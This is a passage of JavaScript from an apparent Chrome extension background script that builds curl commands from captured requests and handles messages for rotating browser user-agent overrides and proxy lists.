    const sorted = [...req.requestHeaders]
      .filter((h) => !stripHdr(h))
      .sort((a, b) => {
        const na = (a.name || '').toLowerCase();
        const nb = (b.name || '').toLowerCase();
        if (na === 'user-agent') return 1;
        if (nb === 'user-agent') return -1;
        return na.localeCompare(nb);
      });
    for (const h of sorted) {
      lines.push('  -H ' + sq((h.name || '').toLowerCase() + ': ' + (h.value || '')));
    }
  }

  if (req.body && typeof req.body === 'string') {
    lines.push('  --data-raw $' + dqLD(req.body));
  }

  return lines.join(' \\\n');
}

function sq(str) {
  return "'" + str.replace(/'/g, "'\\''") + "'";
}

function dqLD(str) {
  return "'" + str
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "'\\''")
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\t/g, '\\t') + "'";
}

function truncateUrl(url, max) {
  max = max || 60;
  return url.length > max ? url.slice(0, max) + '…' : url;
}

async function getUAState() {
  const r = await chrome.storage.local.get(UA_STATE_KEY);
  return r[UA_STATE_KEY] || { enabled: false, index: 0 };
}

async function setUAState(state) {
  await chrome.storage.local.set({ [UA_STATE_KEY]: state });
}

async function getUAList() {
  const r = await chrome.storage.local.get("nonoUAList");
  const list = Array.isArray(r.nonoUAList) && r.nonoUAList.length ? r.nonoUAList : DEFAULT_UAS.slice();
  return list;
}

async function applyUAOverride(tabId, ua) {
  if (tabId == null) return { ok: false, error: "no tab" };
  try {
    await chrome.debugger.sendCommand({ tabId: tabId }, "Network.setUserAgentOverride", {
      userAgent: ua,
      platform: /Macintosh/.test(ua) ? "MacIntel" : /Firefox/.test(ua) ? "Linux" : "Win32"
    });
    return { ok: true };
  } catch (e) {
    return { ok: false, error: String((e && e.message) || e) };
  }
}

async function handleUAMessage(msg, sendResponse) {
  try {
    switch (msg.action) {
      case "UA_GET_STATE": {
        sendResponse({ state: await getUAState(), list: await getUAList() });
        return;
      }
      case "UA_SET_LIST": {
        const list = (msg.text || "").split(/\r?\n/).map((s) => s.trim()).filter(Boolean);
        await chrome.storage.local.set({ nonoUAList: list });
        sendResponse({ ok: true, list: list });
        return;
      }
      case "UA_SET_STATE": {
        const state = { enabled: !!msg.enabled, index: typeof msg.index === "number" ? msg.index : 0 };
        await setUAState(state);
        if (state.enabled) {
          const list = await getUAList();
          if (state.index >= list.length) state.index = 0;
          const ua = list[state.index];
          await setUAState(state);
          await applyUAOverride(msg.tabId, ua);
        }
        sendResponse({ ok: true, state: state });
        return;
      }
      case "UA_NEXT": {
        const state = await getUAState();
        if (!state.enabled) { sendResponse({ ok: false, label: "", skipped: true }); return; }
        const list = await getUAList();
        if (!list.length) { sendResponse({ ok: false, label: "", error: "no uas" }); return; }
        let idx = state.index + 1;
        if (idx >= list.length) idx = 0;
        state.index = idx;
        state.enabled = true;
        await setUAState(state);
        const ua = list[idx];
        const r = await applyUAOverride(msg.tabId || dbgTabId, ua);
        const short = ua.replace(/^Mozilla\/5\.0\s*\([^)]*\)\s*/, "").split("/")[0] || "UA";
        sendResponse({ ok: r.ok, index: idx, total: list.length, label: short + " #" + (idx + 1), error: r.error });
        return;
      }
      case "UA_APPLY_INDEX": {
        const state = await getUAState();
        const list = await getUAList();
        let idx = typeof msg.index === "number" ? msg.index : state.index;
        if (idx >= list.length) idx = 0;
        state.index = idx;
        state.enabled = true;
        await setUAState(state);
        const ua = list[idx];
        const r = await applyUAOverride(msg.tabId || dbgTabId, ua);
        sendResponse({ ok: r.ok, index: idx, label: ua, error: r.error });
        return;
      }
      default:
        sendResponse({ ok: false, error: "unknown ua action" });
    }
  } catch (e) {
    sendResponse({ ok: false, error: String((e && e.message) || e) });
  }
}

async function handleProxyMessage(msg, sendResponse) {
  try {
    switch (msg.action) {
      case 'PROXY_GET_STATE': {
        const state = await loadState();
        const list = await loadList();
        sendResponse({ state: state, list: list });
        return;
      }
      case 'PROXY_PARSE_LIST': {
        const list = parseProxyText(msg.text || '');
        await saveList(list);
        const state = await loadState();
        sendResponse({ list: list, state: state });
        return;
      }
      case 'PROXY_SET_STATE': {
        const list = await loadList();
        let index = typeof msg.index === 'number' ? msg.index : 0;
        if (index >= list.length && list.length) index = 0;
        await saveState({
          enabled: !!msg.enabled,
          mode: msg.mode || 'single',
          index: index,
          exitIP: msg.exitIP || '',
          lastError: ''
        });
        const r = await applyCurrent();
        sendResponse(Object.assign({ proxy: r.proxy ? r.proxy : null }, r));
        return;
      }
      case 'PROXY_ROTATE': {
        const r = await rotate();
        sendResponse(Object.assign({ proxy: r.proxy ? r.proxy : null }, r));
        return;
      }
      case 'PROXY_APPLY_INDEX': {
        const r = await rotate(msg.index);
        sendResponse(Object.assign({ proxy: r.proxy ? r.proxy : null }, r));
        return;
      }
      case 'PROXY_OFF': {
        const state = await loadState();
        state.enabled = false;
        state.exitIP = '';
        await saveState(state);
        const r = await clearProxy();
        sendResponse({ ok: r.ok, proxy: null, error: r.error });
        return;
      }
      case 'PROXY_STATUS': {
        const state = await loadState();
        const list = await loadList();
        const p = state.enabled && list[state.index] ? list[state.index] : null;
        sendResponse({ enabled: state.enabled, proxy: p, label: p ? p.label : 'OFF' });
        return;
      }
      case 'PROXY_BEFORE_HIT': {
        const state = await loadState();
        if (!state.enabled) {
          sendResponse({ proxy: null, ok: false });
          return;
        }
        const r = state.mode === 'rotate' ? await rotate() : await applyCurrent();
        sendResponse({ proxy: r.proxy ? r.proxy : null, ok: r.ok, error: r.error });
        return;
      }
      case 'PROXY_TEST': {
        const r = await testProxy(typeof msg.index === 'number' ? msg.index : 0);
        sendResponse(r);
        return;
      }
      case 'PROXY_TEST_ALL': {
        sendResponse({ running: true });
        testAll();
        return;
      }
      default:
        sendResponse({ error: 'unknown proxy action' });
    }
  } catch (e) {
    sendResponse({ ok: false, error: String((e && e.message) || e) });
  }
}